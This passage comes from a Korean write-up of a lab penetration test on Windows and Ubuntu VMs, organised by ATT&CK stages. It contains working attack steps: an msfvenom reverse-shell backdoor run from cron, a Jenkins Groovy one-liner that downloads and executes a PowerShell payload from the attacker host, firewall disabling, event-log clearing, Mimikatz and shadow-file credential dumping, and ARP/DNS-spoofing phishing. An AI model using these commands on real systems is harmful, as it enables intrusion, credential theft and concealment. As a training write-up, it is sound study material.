    4.  **지속성 검증:** 공격자 PC에서 `multi/handler` 리스너를 실행하고 대기시킨 상태에서, 대상 Windows 서버를 재부팅했다. 재부팅 및 로그온 과정이 완료되자, 사전에 구축한 **두 가지 지속성 메커니즘이 모두 성공적으로 작동하여 공격자의 C2 서버로 두 개의 독립적인 Meterpreter 세션이 거의 동시에 연결되는 것을 확인**했다.
*   **영향 분석:** 두 가지 이상의 지속성 기법을 동시에 사용하는 것은 매우 효과적인 APT(Advanced Persistent Threat) 전략이다. 방어자가 하나의 백도어(예: 예약 작업)를 발견하고 제거하더라도, 다른 백도어(예: 레지스트리 Run 키)가 여전히 살아남아 공격자에게 지속적인 접근을 허용한다. 이는 일회성 침투가 아닌 장기적인 시스템 장악을 목표로 하는 공격의 핵심적인 특징이며, 방어자가 침해 사고의 흔적을 완벽하게 제거하는 것을 극도로 어렵게 만든다.

![wper1](/assets/images/att-ck/5.1.1.wper.png)
![wper2](/assets/images/att-ck/5.1.2.wper.png)

#### 5.2. Ubuntu Server (10.0.0.42): Crontab을 이용한 지속성 확보

*   **기술 분석:** 리눅스 및 유닉스 계열 운영체제에서 가장 고전적이면서도 강력한 지속성 확보 기법은 스케줄링 데몬인 `cron`을 악용하는 것이다. `cron`은 사용자가 지정한 시간에 주기적으로 특정 명령어(스크립트, 프로그램)를 실행해주는 역할을 한다. 공격자는 `crontab`이라는 설정 파일을 수정하여, 매 분, 매 시간, 또는 시스템이 부팅될 때마다 자신의 악성 페이로드(백도어)가 자동으로 실행되도록 등록할 수 있다. 이는 눈에 잘 띄지 않으면서도 매우 안정적인 지속성 채널을 제공한다.

*   **공격 검증:**
    1.  **리눅스용 64비트 백도어 생성:** `msfvenom`을 사용하여 Ubuntu 서버(Linux, 64비트)에서 실행될 수 있는 ELF(Executable and Linkable Format) 형식의 백도어를 생성했다.
        ```bash
        msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.32 LPORT=5555 -f elf -o /root/backdoor.elf
        ```
    2.  **백도어 파일 업로드:** `vagrant` 계정으로 확보한 SSH 세션을 활용하여, 공격자 PC에서 실행한 임시 웹 서버로부터 `wget` 명령어로 백도어 파일을 다운로드하여 `/tmp/backdoor.elf` 경로에 저장했다.
    3.  **실행 권한 부여 및 Crontab 등록:** 업로드한 백도어 파일에 `chmod +x` 명령으로 실행 권한을 부여한 후, `crontab -e` 명령으로 `vagrant` 사용자의 cron 설정 파일을 열고 파일의 맨 아래에 다음 라인을 추가했다.
        ```
        * * * * * /tmp/backdoor.elf
        ```
        *   `* * * * *`: "매 분, 매 시간, 매일, 매월, 매주" 라는 의미로, **1분마다** 뒤에 오는 명령어를 실행하라는 뜻이다. 이는 재부팅 없이도 지속성을 즉시 검증할 수 있게 해준다.
    4.  **지속성 검증:** 공격자 PC의 Metasploit에서 `multi/handler`를 사용하여, `backdoor.elf` 생성 시 사용했던 것과 동일한 `linux/x64/meterpreter/reverse_tcp` 페이로드와 포트(5555)로 리스너를 실행했다. `cron` 설정이 적용된 후 **최대 1분을 기다리자**, `cron` 데몬이 등록된 작업을 실행하여 백도어를 실행했고, 그 결과 Metasploit 리스너에 새로운 Meterpreter 세션이 성공적으로 연결되는 것을 확인했다.

*   **영향 분석:** `cron`을 이용한 지속성 확보는 리눅스 시스템 공격에서 매우 효과적이다. 시스템 관리자가 정기적으로 `crontab` 설정 파일을 감사하지 않는 한, 공격자의 백도어는 시스템이 운영되는 내내 1분마다 꾸준히 C2 서버 접속을 시도하며 조용히 살아남는다. 초기 침투 경로였던 SSH 비밀번호가 변경되거나 Drupal 취약점이 패치되더라도, 공격자는 이 `cron` 백도어를 통해 언제든지 다시 시스템에 접근하여 제어권을 유지할 수 있다.

![uper1](/assets/images/att-ck/5.2.1.uper.png)
![uper2](/assets/images/att-ck/5.2.2.uper.png)
![uper3](/assets/images/att-ck/5.2.3.uper.png)

## 6. 권한 상승 Privilege Escalation

초기 접근을 통해 획득한 셸의 권한이 일반 사용자나 서비스 계정처럼 제한적일 경우, 공격자는 시스템을 완전히 제어하기 위해 더 높은 권한, 궁극적으로는 최고 관리자(Windows의 `NT AUTHORITY\SYSTEM`, Linux의 `root`) 권한을 얻기 위한 공격을 수행한다.

*   **기술 분석 (T1059.006: Groovy / T1190: Exploit Public-Facing Application):** 권한 상승은 커널 취약점 공격, 권한이 높은 서비스의 설정 오류 악용, 저장된 관리자 자격 증명 탈취 등 다양한 방법을 통해 이루어진다. 이 시나리오에서는 Nmap과 Nessus 스캔에서 발견된 Jenkins 서비스의 설정 오류를 악용한다. Jenkins는 CI/CD(지속적 통합/지속적 배포)를 위한 자동화 서버로, 강력한 시스템 제어 기능을 내포하고 있다. 특히 'Script Console' 기능은 서버에서 Groovy 스크립트를 직접 실행할 수 있게 해주는데, 만약 이 기능이 인증 없이 외부에 노출되어 있다면 공격자에게 즉각적인 원격 코드 실행 경로를 제공한다.
*   **공격 검증:**
    1.  웹 브라우저로 `http://10.0.0.31:8484/script`에 접속하여 인증 절차 없이 'Script Console'에 접근 가능함을 확인했다.
    2.  공격자는 PowerShell을 이용하여 C2 서버(10.0.0.32)로 리버스 셸을 연결하는 명령어를 준비했다.
    3.  Jenkins의 Script Console은 Groovy 언어를 사용하므로, PowerShell 명령어를 실행하기 위해 다음과 같은 Groovy 스크립트를 작성하여 콘솔에 입력하고 실행했다.
        ```groovy
        def command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.32/shell.ps1');\""
        command.execute()
        ```
    4.  스크립트 실행과 동시에, 공격자의 C2 서버에서 대기 중이던 Netcat 또는 Metasploit 리스너에 새로운 셸이 연결되었다.
    5.  연결된 셸에서 `whoami` 명령을 실행한 결과, `nt authority\system`으로 출력되어 최고 관리자 권한을 획득했음을 확인했다.
*   **영향 분석:** 서비스의 부적절한 설정이 어떻게 즉각적인 최고 권한 탈취로 이어질 수 있는지 보여주는 대표적인 사례다. 개발 및 운영의 편의를 위해 열어둔 관리 기능이 외부로 노출될 경우, 복잡한 취약점 공격 없이도 단 몇 줄의 스크립트만으로 시스템 전체가 장악될 수 있다. 이는 '최소 권한의 원칙'과 '공격 표면 최소화'가 얼마나 중요한지를 명확히 보여준다.

![wpri1](/assets/images/att-ck/6.1.pri.png)
![wpri2](/assets/images/att-ck/6.2.pri.png)

## 7. 방어 회피 Defense Evasion

공격자는 자신의 활동을 은닉하고, 백신(Antivirus), 호스트 기반 침입 탐지 시스템(HIDS), 그리고 시스템 로그 등 방어자의 탐지 메커니즘을 무력화하거나 우회하기 위한 기술을 사용한다. 이는 공격의 생존성을 높이고 발각될 가능성을 최소화하기 위한 필수적인 과정이다.

*   **기술 분석:** 방어 회피 기술은 매우 다양하며, 이 시나리오에서는 시스템의 기본 보안 기능을 직접적으로 비활성화하는 방법을 사용한다.
    *   **방화벽 비활성화 (T1562.004: Impair Defenses: Disable or Modify System Firewall):** Windows 방화벽은 인바운드/아웃바운드 네트워크 트래픽을 제어하는 핵심적인 방어 수단이다. 공격자는 이를 비활성화하여 C2 서버와의 통신을 원활하게 하고, 추가적인 공격 도구를 다운로드하거나 내부망의 다른 시스템으로 스캔을 수행할 때 발생할 수 있는 제약을 제거한다.
    *   **로그 삭제 (T1070.001: Indicator Removal on Host: Clear Windows Event Logs):** Windows 이벤트 로그는 시스템에서 발생하는 주요 활동(로그인 성공/실패, 프로세스 생성, 시스템 설정 변경 등)을 기록한다. 공격자는 자신의 침투 및 활동 기록을 지워 포렌식 분석을 방해하고 침해 사실 자체를 은폐하고자 한다.
*   **공격 검증:**
    1.  '권한 상승' 단계를 통해 획득한 `SYSTEM` 권한의 셸을 사용했다.
    2.  **방화벽 비활성화:** `netsh advfirewall set allprofiles state off` 명령어를 실행하여 도메인, 개인, 공용 프로필의 방화벽을 모두 비활성화했다. `netsh advfirewall show allprofiles` 명령으로 상태가 'OFF'로 변경되었음을 확인했다.
    3.  **로그 삭제:** `wevtutil cl System`, `wevtutil cl Security`, `wevtutil cl Application` 명령어를 차례로 실행하여 시스템, 보안, 응용 프로그램 로그를 모두 삭제하였다. 이후 `eventvwr.msc`를 실행하여 해당 로그들이 비어있음을 확인했다. 이 내용은 '14. 영향' 단계에서 최종적으로 다룬다.
*   **영향 분석:** 방어 회피 기술의 성공은 방어자가 침해 사고를 인지하고 대응하는 것을 극도로 어렵게 만든다. 방화벽이 비활성화되면 네트워크 기반 탐지가 어려워지고, 로그가 삭제되면 공격자의 행적을 추적할 수 있는 유일한 증거가 사라진다. 이는 중앙 집중식 로그 관리(SIEM) 시스템과 로그 위변조 방지 대책의 필요성을 강조한다.

![wdef1](/assets/images/att-ck/7.1.def.png)
![wdef2](/assets/images/att-ck/7.2.def.png)

## 8. 자격증명 탈취 Credential Access

공격자는 시스템에 존재하는 다른 사용자 계정 정보(자격증명)를 탈취하여 권한을 상승시키거나, 내부망의 다른 시스템으로 공격을 확장(횡적 이동)하기 위한 발판을 마련한다. 이 단계에서는 메모리에 저장된 자격증명을 덤프하는 기법과 네트워크 트래픽을 가로채는 중간자 공격(MITM)을 사용한다.

### 8.1.1. 서버 자격증명 덤프 T1003
*   **기술 분석:** Windows 운영체제는 사용자의 편의를 위해 Single Sign-On(SSO)과 같은 기능을 지원하며, 이 과정에서 사용자 계정 정보(암호 또는 해시)를 `LSASS.exe`(Local Security Authority Subsystem Service) 프로세스의 메모리에 캐시한다. `SYSTEM` 권한을 가진 공격자는 이 메모리 영역에 접근하여 캐시된 자격증명을 평문(Plaintext) 형태로 추출할 수 있다. 또한, 시스템의 모든 로컬 계정 정보와 패스word 해시는 `SAM`(Security Account Manager) 파일에 암호화되어 저장되는데, 이 역시 `SYSTEM` 권한이 있으면 접근하여 NTLM 해시를 추출할 수 있다.
*   **공격 검증:**
    1.  '권한 상승' 등을 통해 획득한 `NT AUTHORITY\SYSTEM` 권한의 Meterpreter 세션을 활용했다.
    2.  **LSASS 메모리 덤프 (T1003.001):**
        *   Meterpreter 프롬프트에서 `load kiwi` 명령을 실행하여 Mimikatz 기능을 확장 모듈로 로드했다.
        *   `creds_all` 명령을 실행하자, Kiwi는 LSASS 프로세스 메모리를 스캔하여 현재 로그인 되어 있거나 과거에 로그인했던 계정들의 자격 증명을 덤프했다. 그 결과, `vagrant`, `sshd_server` 등 여러 계정의 암호를 **일반 텍스트(Plaintext)** 형태로 획득할 수 있었다.
    3.  **SAM 해시 덤프 (T1003.002):**
        *   `hashdump` 명령어를 실행했다. 이 명령은 SAM 데이터베이스에 접근하여 시스템에 등록된 모든 로컬 사용자 계정의 NTLM 패스word 해시를 `[사용자명]:[RID]:[LM 해시]:[NTLM 해시]` 형식으로 추출했다.
*   **영향 분석:**
    *   **평문 암호 획득:** 탈취한 평문 암호는 즉시 다른 서비스(SSH, FTP 등)나 내부의 다른 시스템에 재사용될 수 있어, 즉각적인 횡적 이동으로 이어진다.
    *   **NTLM 해시 획득:** NTLM 해시는 `Pass-the-Hash` 공격에 사용되어, 암호를 몰라도 해시 값만으로 다른 시스템에 인증하고 접근할 수 있게 한다. 또한 `John the Ripper`나 `Hashcat`과 같은 도구를 이용한 오프라인 크래킹을 통해 원래 암호를 알아낼 수도 있다. 이 정보들은 공격자에게 매우 가치 있는 핵심 자산이다.

![wcre1](/assets/images/att-ck/8.1.1.cre.png)
![wcre2](/assets/images/att-ck/8.1.2.cre.png)

### 8.1.2 Ubuntu Server: Shadow 파일 해시 덤프 (T1003.008)

*   **기술 분석:** 리눅스 및 유닉스 계열 운영체제는 사용자 계정의 패스워드 해시를 `/etc/shadow` 파일에 저장한다. 이 파일은 보안상 매우 중요하기 때문에 오직 `root` 사용자만이 읽기 권한을 가진다. 파일에는 각 사용자별로 솔트(Salt)가 적용된 강력한 해시 알고리즘(예: SHA-512)으로 암호화된 패스워드 정보가 저장되어 있다. 공격자는 `root` 권한을 획득한 후 이 파일을 탈취하여 오프라인에서 해시 크랙을 시도한다.

*   **공격 검증:**
    1.  '권한 상승' 단계에서 **커널 익스플로잇**을 통해 획득한 `root` 권한의 셸을 활용했다.
    2.  `root` 셸에서 `cat /etc/shadow` 명령어를 직접 실행하여 파일의 전체 내용을 화면에 출력했다.
    3.  그 결과, `root`, `vagrant`, `ircd` 등 시스템에 존재하는 모든 사용자 계정과 그에 해당하는 암호화된 패스워드 해시, 그리고 패스워드 정책 관련 정보가 모두 노출되는 것을 확인했다.
        ```
        root:$6$a.../:18469:0:99999:7:::
        vagrant:$6$b.../:18469:0:99999:7:::
        ...
        ```
        * `$6$`는 이 해시가 SHA-512 알고리즘으로 생성되었음을 의미한다.

*   **영향 분석 (Ubuntu):** `/etc/shadow` 파일의 탈취는 공격자에게 시스템의 모든 로컬 계정 암호를 크랙할 수 있는 기회를 제공한다. 비록 Windows의 LSASS 덤프처럼 평문 암호가 바로 노출되지는 않지만, 공격자는 탈취한 해시 목록과 `rockyou.txt`와 같은 대규모 사전 파일을 `John the Ripper`나 `Hashcat`과 같은 강력한 크랙 도구에 입력하여 오프라인에서 무제한으로 크랙을 시도할 수 있다. 만약 사용자가 취약한 암호를 사용했다면, 수 분 내에 원래 암호가 복구될 수 있으며, 이 암호는 다른 시스템이나 서비스로의 횡적 이동에 악용될 수 있다.

![ucre1](/assets/images/att-ck/8.1.3.cre.png)

### 8.2. 중간자 공격(MITM)을 통한 클라이언트 자격증명 탈취 T1557
*   **기술 분석:** 중간자 공격(Man-in-the-Middle)은 공격자가 동일 네트워크 대역에 있는 두 통신 주체(예: 클라이언트 PC와 게이트웨이) 사이에 끼어들어 모든 트래픽을 가로채고 변조하는 공격이다.
    1.  **ARP Spoofing:** 공격자는 피해자(클라이언트 PC)에게 자신이 게이트웨이라고 속이고, 게이트웨이에게는 자신이 피해자라고 속이는 위조된 ARP(Address Resolution Protocol) 패킷을 지속적으로 전송한다. 이로 인해 피해자와 게이트웨이의 ARP 테이블이 오염되고, 둘 사이의 모든 트래픽은 공격자의 PC를 거치게 된다.
    2.  **DNS Spoofing:** 트래픽을 가로채는 상태에서, 공격자는 피해자가 특정 도메인(예: naver.com)으로 보내는 DNS 쿼리를 감시한다. 정상적인 DNS 서버가 응답하기 전에, 공격자는 해당 도메인의 IP 주소가 자신의 웹 서버(피싱 사이트) IP라고 속이는 위조된 DNS 응답을 보낸다.
*   **공격 검증:**
    1.  `ettercap -G` 명령어로 Ettercap GUI 모드를 실행했다.
    2.  'Scan for hosts'로 네트워크의 호스트 목록을 스캔한 후, 피해자 PC(예: 10.0.0.100)를 'Target 1'로, 게이트웨이(예: 10.0.0.1)를 'Target 2'로 지정했다.
    3.  'Mitm' 메뉴에서 'ARP poisoning'을 선택하고 'Sniff remote connections' 옵션을 활성화하여 중간자 공격을 시작했다.
    4.  'Plugins' 메뉴에서 'dns_spoof' 플러그인을 활성화했다. `etter.dns` 설정 파일에 `naver.com A 10.0.0.32`와 같이 피싱할 도메인과 공격자 IP를 미리 설정해두었다.
    5.  피해자 PC의 웹 브라우저에서 `http://naver.com`에 접속하자, 공격자가 미리 준비해둔 가짜 로그인 페이지가 나타났다.
    6.  피해자가 해당 페이지에 ID와 비밀번호(`admin:Password`)를 입력하고 로그인 버튼을 누르자, 이 정보가 공격자 웹 서버의 로그 파일에 평문으로 기록됨을 확인했다.
*   **영향 분석:** 이는 서버 한 대의 침해가 내부 네트워크 전체의 보안을 위협할 수 있음을 보여주는 강력한 증거다. 암호화되지 않은 내부 통신(HTTP)의 위험성을 명확히 보여주며, 내부 사용자들의 민감한 자격 증명이 손쉽게 탈취될 수 있음을 증명한다. 이는 스위치 단에서 ARP Spoofing을 탐지/차단하는 Dynamic ARP Inspection(DAI)과 같은 보안 기능과, 모든 내부 웹 서비스에 HTTPS를 적용하는 것의 필요성을 강조한다.

![wmitm1](/assets/images/att-ck/8.2.1.mitm.png)
![wmitm2](/assets/images/att-ck/8.2.2.mitm.png)

## 9. 탐색 Discovery

초기 발판을 마련한 후, 공격자는 추가 공격을 계획하고 목표를 달성하기 위해 시스템 내부 및 네트워크 환경에 대한 정보를 수집한다. 이 '탐색' 단계는 공격자가 '현재 어디에 있으며, 무엇을 할 수 있고, 어디로 더 갈 수 있는지'를 파악하는 과정으로, 후속 공격의 성공률을 높이는 데 필수적이다.

*   **기술 분석:** 공격자는 주로 운영체제에 내장된 기본 명령어들을 사용하여 시스템 정보를 수집한다. 이는 별도의 도구를 설치하지 않아 보안 솔루션의 탐지를 피하는 데 유리하기 때문이다('Living off the Land'). 각 명령어는 특정한 목적을 가지고 사용된다.
*   **공격 검증:**
    '실행' 단계에서 획득한 셸을 통해 다음과 같은 탐색 명령어들을 순차적으로 실행했다.
    1.  **시스템 네트워크 구성 정보 발견 (T1016):**
        *   `ipconfig /all`: 현재 시스템의 IP 주소, 서브넷 마스크, 게이트웨이, DNS 서버 등 상세한 네트워크 인터페이스 정보를 확인한다. 이를 통해 시스템이 속한 네트워크 대역(10.0.0.0/24)을 파악했다.
        *   `route print`: 라우팅 테이블을 확인하여 시스템이 통신할 수 있는 다른 네트워크 대역이나 기본 게이트웨이 정보를 파악한다.
    2.  **원격 시스템 발견 (T1018):**
        *   `arp -a`: ARP 캐시 테이블을 조회하여 현재 시스템과 최근에 통신한 내부 네트워크의 다른 호스트들의 IP 주소와 MAC 주소 목록을 확인한다. 이를 통해 추가 공격 대상(예: 10.0.0.42)의 존재를 인지했다.
    3.  **계정 발견 (T1087.001: 로컬 계정):**
        *   `net user`: 시스템에 등록된 모든 로컬 사용자 계정(`Administrator`, `vagrant`, `sshd_server` 등)의 목록을 확인한다.
    4.  **권한 그룹 발견 (T1069.001: 로컬 그룹):**
        *   `net localgroup administrators`: 로컬 관리자 그룹에 속한 계정들을 확인하여 권한 상승의 대상이 될 수 있는 계정을 식별한다.
    5.  **프로세스 발견 (T1057):**
        *   `tasklist /svc`: 현재 실행 중인 모든 프로세스와 각 프로세스에 연관된 서비스 목록을 확인한다. 이를 통해 백신이나 모니터링 에이전트와 같은 보안 솔루션의 실행 여부를 추정할 수 있다.
    6.  **시스템 네트워크 연결 발견 (T1049):**
        *   `netstat -ano`: 현재 시스템의 모든 활성 네트워크 연결(TCP, UDP)과 리스닝 포트, 그리고 각 연결을 생성한 프로세스의 ID(PID)를 확인한다. 이를 통해 시스템이 외부 또는 내부의 다른 시스템과 어떻게 통신하고 있는지 파악하고, 숨겨진 백도어나 C2 채널을 탐지할 수 있다.
*   **영향 분석:** 탐색 단계는 공격자에게 '내부 지형도'를 제공한다. 획득한 정보를 통해 공격자는 다음 공격 목표를 정하고, 가장 효과적인 공격 경로를 설계하며, 방어자의 탐지를 피하기 위한 전략을 수립할 수 있다. 예를 들어, `arp -a`를 통해 발견한 다른 서버는 횡적 이동의 대상이 되고, `net user`를 통해 발견한 계정은 자격증명 탈취의 목표가 된다.

![wdis1](/assets/images/att-ck/9.1.wdis.png)
![wdis2](/assets/images/att-ck/9.2.wdis.png)
![wdis3](/assets/images/att-ck/9.3.wdis.png)
![wdis4](/assets/images/att-ck/9.4.wdis.png)

### 10. 횡적 이동 Lateral Movement

하나의 시스템(예: Windows 서버)을 장악한 후, 공격자는 동일 네트워크 대역에 존재하는 다른 시스템(예: Ubuntu 서버)으로 공격을 확장하여 더 많은 시스템을 장악하고 목표 데이터에 더 가까이 다가가려 한다. 이를 '횡적 이동'이라고 한다.

*   **기술 분석 (T1021.004: 원격 서비스: SSH / T1572: 프로토콜 터널링):** 횡적 이동은 주로 탈취한 자격증명을 사용하여 정상적인 원격 관리 프로토콜을 통해 다른 시스템에 로그인하는 방식으로 이루어진다. 초기 시나리오는 Windows 서버에 저장된 SSH 개인 키를 탈취하여 Ubuntu 서버에 접속하는 것이었으나, 실제 환경은 예상과 달랐다. 공격자는 환경적 제약을 극복하기 위해 Meterpreter의 강력한 프로토콜 터널링(포트 포워딩) 기능을 활용하는 방식으로 전략을 수정했다.
*   **공격 검증:**
    1.  **Plan A (SSH 키 탈취) 시도 및 실패:**
        *   Windows 서버(10.0.0.31)를 탐색하던 중, `vagrant` 계정의 홈 디렉터리(`C:\Users\vagrant\.ssh`)를 확인했다. 그러나 예상했던 개인 키(`id_rsa`)는 존재하지 않았고, 대신 접속을 허용하는 목록인 `authorized_keys` 파일만이 발견되었다. 이로써 SSH 키를 이용한 횡적 이동 계획은 실패했다.
    2.  **Plan B (직접 SSH 접속) 시도 및 실패:**
        *   차선책으로, 이미 알고 있는 Ubuntu 서버의 SSH 자격증명(`vagrant:vagrant`)을 사용하여 Windows 서버에서 직접 접속을 시도했다. `SYSTEM` 권한의 Meterpreter 세션에서 `powershell_shell`로 진입한 후, `C:\Windows\System32\OpenSSH\ssh.exe` 클라이언트를 이용해 접속을 시도했다.
        *   그러나 대상 시스템의 환경적인 문제로 인해 "term '...' is not recognized" 라는 오류가 발생하며 SSH 클라이언트 실행 자체가 실패했다. 이로써 Windows 서버를 직접적인 발판으로 삼는 계획 또한 무산되었다.
    3.  **Plan C (프로토콜 터널링)을 통한 최종 성공:**
        *   모든 직접적인 접근이 막히자, 공격자는 Meterpreter의 `portfwd` 기능을 사용하여 공격 경로를 우회하는 터널을 생성했다.
            ```bash
            meterpreter > portfwd add -l 2222 -p 22 -r 10.0.0.42
            ```
            이 명령은 공격자 PC(Kali)의 **로컬 2222번 포트**로 들어오는 모든 연결을, 현재 장악한 Windows 서버(Meterpreter 세션)를 통해 **내부망의 Ubuntu 서버(10.0.0.42) 22번 포트로 투명하게 전달**하는 TCP 터널을 생성한다.
        *   터널이 생성된 후, 공격자는 **새로운 Kali 터널**에서 마치 자기 자신에게 접속하듯이 아래 명령어를 실행했다.
            ```bash
            ssh vagrant@127.0.0.1 -p 2222
            ```
        *   이 연결은 생성된 터널을 통해 Ubuntu 서버로 성공적으로 전달되었고, 비밀번호 프롬프트에 `vagrant`를 입력하자 **패스워드 인증을 거쳐 최종적으로 Ubuntu 서버의 셸을 획득**하며 횡적 이동에 성공했다.
*   **영향 분석:** 횡적 이동의 성공은 초기 침해 사고가 전사적인 데이터 유출 사고로 확산되는 결정적인 변곡점이다. 특히 이번 공격 과정은 공격자가 단일 실패에 좌절하지 않고, 환경적 제약을 극복하기 위해 포트 포워딩과 같은 고급 기술을 사용하여 어떻게든 목표를 달성한다는 것을 명확히 보여준다. 하나의 시스템이 제어권을 완전히 상실하면, 방화벽 규칙에 의해 직접적인 접근이 차단된 내부의 다른 시스템들마저도 해당 시스템을 '좀비 PC' 삼아 터널링하는 공격에 무방비로 노출될 수 있음을 증명한다.

![wlat1](/assets/images/att-ck/10.1.wlat.png)
![wlat2](/assets/images/att-ck/10.2.wlat.png)
![wlat3](/assets/images/att-ck/10.3.wlat.png)

## 11. 정보 수집 Collection

두 서버의 제어권을 모두 확보한 후, 공격자는 프로젝트의 최종 목표인 'Flag' 파일을 수집하고 분석한다. 이 단계는 공격자의 최종 목표(정보 유출, 파괴 등)를 달성하기 위해 시스템 내에 존재하는 가치 있는 데이터를 식별하고 추출하는 과정이다. 단순한 파일 검색(**T1083: 파일 및 디렉터리 검색**)을 넘어, 각 파일에 적용된 데이터 은닉, 암호화, 손상 등 방어 기법을 극복하기 위한 디지털 포렌식 및 암호 해독 기술이 사용된다.

### 11.1. Windows Server (10.0.0.31) Flag 분석

Windows 서버에서는 `dir /s /b C:\*flag*`, `dir /s /b C:\*_of_*`, `dir /s /b C:\*king*` 등의 명령어로 후보 파일들을 식별한 후, 각 파일의 특성에 맞는 심층 분석을 진행했다.

---

#### 11.1.1. Ace of Hearts.jpg (스테가노그래피)
*   **발견:** `C:\Users\vagrant\Pictures`에서 `ace_of_hearts.jpg` 파일 발견. 일반적인 사용자의 바탕화면에 위치하여 쉽게 눈에 띄었다.
*   **분석:** 파일은 정상적인 JPEG 이미지로 보였으나, 파일 크기가 약 8MB로 일반적인 카드 이미지에 비해 비정상적으로 컸다. 이는 보이는 이미지 데이터 외에 추가적인 데이터가 숨겨져 있을 가능성을 강력히 시사한다. 이처럼 하나의 파일 내에 다른 파일이나 데이터를 은닉하는 기법을 **스테가노그래피(Steganography)**라고 한다. 공격자는 파일의 구조를 분석하여 숨겨진 데이터를 찾아내는 도구인 `binwalk`를 사용하기로 결정했다.
*   **해결:**
    1.  Meterpreter의 `download` 명령으로 파일을 공격자 PC로 가져왔다.
    2.  `binwalk ace_of_hearts.jpg` 명령어로 파일을 분석했다. 출력 결과, JPEG 이미지 데이터 시그니처 외에 파일의 특정 오프셋(Offset)에서 **Zip 아카이브 시그니처(PK...**가 시작됨을 명확히 확인했다.
    3.  `binwalk --dd='.*' ace_of_hearts.jpg` 명령어를 실행하여 파일 내에서 발견된 모든 시그니처를 기반으로 숨겨진 파일들을 자동으로 추출(Carving)했다.
*   **결과:** 현재 디렉터리에 `_ace_of_hearts.jpg.extracted`라는 폴더가 생성되었고, 그 안에 숨겨져 있던 Zip 파일이 추출되었다. 추출된 Zip 파일의 압축을 해제하자 최종 Flag 'Ace of Hearts' 카드 이미지를 획득했다. 이는 겉보기에는 정상인 파일이라도 반드시 내부 구조를 분석하여 은닉된 정보가 있는지 확인해야 함을 보여준다.

![wflag1](/assets/images/att-ck/11.1.1.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.1.2.wflag.png)

---

#### 11.1.2. Three of Spades.txt (XOR 암호화)
*   **발견:** `C:\glassfish4\glassfish\domains\domain1\config` 경로에서 `three_of_spades.txt` 파일이 발견될 것으로 예상되었다. GlassFish 서버의 설정 파일 경로에 위치하여, 서비스와 관련된 중요 정보일 가능성을 암시했다.
*   **분석:** 파일을 열었을 때 `cat`이나 `type` 명령으로는 의미를 알 수 없는 바이너리 데이터가 표시될 것으로 예상되었다. 파일 크기가 작고, 특정 문자열 패턴(예: Base64)이나 파일 시그니처가 보이지 않아, 가장 단순하고 고전적인 암호화 기법 중 하나인 **단일 바이트 XOR(1-byte XOR Cipher)** 암호화가 적용되었을 것으로 강력하게 의심할 수 있다. XOR 암호는 원본 데이터의 각 바이트를 동일한 '키' 바이트와 XOR 연산하여 암호문을 만드는 방식으로, 키만 알면 동일한 연산으로 완벽하게 복호화가 가능하다.
*   **해결:**
    1.  공격자는 키를 모르기 때문에, 가능한 모든 키(0x00부터 0xFF까지 256개)를 순차적으로 대입하여 복호화를 시도하는 **Brute-force 공격**을 수행할 수 있다.
    2.  이를 위해 다음과 같은 Python 스크립트를 활용할 수 있다. 이 스크립트는 파일을 바이트 배열로 읽어 들인 후, 0부터 255까지의 모든 키로 각 바이트와 XOR 연산을 수행하고 그 결과를 화면에 출력한다.
        ```python
        #!/usr/bin/python
        
        data = bytearray(open('three_of_spades.txt', 'rb').read())
        for key in range(256):
            result = bytearray()
            for byte in data:
                result.append(byte ^ key)
            
            # 의미 있는 문자열(flag, Congratulations 등)이 포함된 결과만 필터링
            if b'flag' in result or b'Congratulations' in result:
                print(f"--- Key: {hex(key)} ---")
                print(result.decode(errors='ignore'))
        ```
*   **결과:** 공략 문서에서는 XOR 복호화로 플래그를 획득할 수 있다고 기록되어 있으나, 현재 환경에서는 파일이 존재하지 않아 직접 확인할 수 없었다. 이는 가상 머신 이미지의 버전 차이나 구성의 차이로 인한 것으로 판단된다.

![wflag1](/assets/images/att-ck/11.1.2.1.wflag.png)

---

#### 11.1.3. Six of Diamonds.zip (탈취한 자격증명 활용)
*   **발견:** 웹 서버의 루트 디렉터리인 `c:\inetpub\wwwroot\six_of_diamonds.zip` 경로에서 발견. 이는 웹 브라우저를 통해 `http://10.0.0.31/six_of_diamonds.zip`으로 직접 접근 및 다운로드가 가능함을 의미한다.
*   **분석:** 파일을 다운로드하여 압축을 해제하려 하자 암호를 요구했다. 이는 파일이 암호로 보호된 Zip 아카이브임을 의미한다. 파일의 이름이나 위치만으로는 암호를 유추하기 어렵기 때문에, 공격자는 지금까지의 침투 과정에서 획득한 다른 정보들을 활용해야 한다고 판단했다.
*   **해결:**
    1.  이 공격 시나리오 전반에 걸쳐 여러 서비스(SSH, FTP 등)에서 공통적으로 발견된 `vagrant` 계정의 패스워드(`vagrant`)가 이 Zip 파일의 암호일 가능성이 높다고 추론했다. 이는 시스템 관리자가 여러 시스템이나 파일에 동일한 암호를 재사용하는 흔한 보안 실수를 가정한 것이다.
    2.  압축 해제 시 암호로 `vagrant`를 입력했다.
*   **결과:** 압축 해제에 성공하여 내부에 있던 'Six of Diamonds' 카드 이미지를 획득했다. 이 Flag는 **하나의 시스템에서 탈취한 자격증명이 다른 데이터 자산(파일)에 대한 접근 권한으로 직접 이어지는** 전형적인 공격 체인을 보여준다. 공격자는 항상 획득한 자격증명을 다른 리소스에 대한 접근 키로 재사용하려 시도한다는 점을 명확히 보여주는 사례이다.

![wflag1](/assets/images/att-ck/11.1.3.1.wflag.png)
![wflag2](/assets/images/att-ck/11.1.3.2.wflag.png)

---

#### 11.1.4. Seven of Hearts.html (Base64 인코딩)
*   **발견:** 웹 서버 루트 디렉터리인 `c:\inetpub\wwwroot\seven_of_hearts.html` 파일 발견. 웹 브라우저로 `http://10.0.0.31/seven_of_hearts.html`에 접속하면 아무것도 표시되지 않는 빈 페이지만 보였다.
*   **분석:** 페이지에 아무것도 보이지 않더라도, HTML 소스 코드 내에 정보가 숨겨져 있을 수 있다. `Burp Suite`로 HTTP 응답을 가로채거나, 브라우저의 '페이지 소스 보기' 기능을 통해 HTML 코드를 확인했다. 그 결과, `<img>` 태그나 텍스트 대신, `data:image/png;base64,` 로 시작하는 매우 긴 텍스트 문자열이 포함되어 있는 것을 발견했다. 이는 **Base64 인코딩** 기법으로, 이미지와 같은 바이너리 데이터를 ASCII 문자열로 변환하여 HTML이나 CSS 파일 내에 직접 포함시키는 방법이다.
*   **해결:**
